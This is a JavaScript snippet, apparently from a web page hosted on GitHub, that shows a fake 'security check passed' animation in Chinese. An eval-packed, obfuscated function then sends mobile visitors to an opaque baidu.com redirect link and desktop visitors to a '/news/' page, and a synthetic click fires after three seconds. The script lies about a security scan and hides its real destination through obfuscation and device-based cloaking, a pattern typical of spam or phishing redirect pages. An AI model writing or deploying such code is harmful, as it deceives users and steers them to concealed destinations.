 var it = document.getElementById('iconText');
    var _i = 1;
    var si = setInterval(function () {
      var txt = '正在安全检测';
      for (var i = 0; i < _i; i++) txt += '.';
      it.innerText = txt;
      if (++_i > 3) {
        clearInterval(si);
        setTimeout(function () {
          var icon = document.getElementById('icon');
          var subText = document.getElementById('subText');
          icon.classList.add("weui-icon-success");
          it.innerHTML = "已通过安全检测";
          subText.innerHTML = "如果没有自动跳转，请点击下方按钮前往";
        }, 300);
      }
    }, 300);
//判断
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('a b(){2 1={};2 p=8.e;2 u=8.f;1.9=p.3("g")==0;1.6=p.3("i")==0;1.h=(p=="d")||(p.3("c")==0);r(1.9||1.6||1.v){7.5.4=\'/t/\'}q{7.5.4="k://j.o.n/m?l=s"}}',32,32,'|system|var|indexOf|href|location|mac|window|navigator|win|function|RuPage|Linux|X11|platform|userAgent|Win|x11|Mac|www|https|url|link|com|baidu||else|if|a3f48d30fc293c5e471ef23de092fddc99ebc4c77043bbea2394d0d0b0d5553d250fa2|news||xll'.split('|'),0,{}))

//点击事件
setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 3000);
© 2021 GitHub, Inc.
Terms
Privacy
Security
Status
Docs
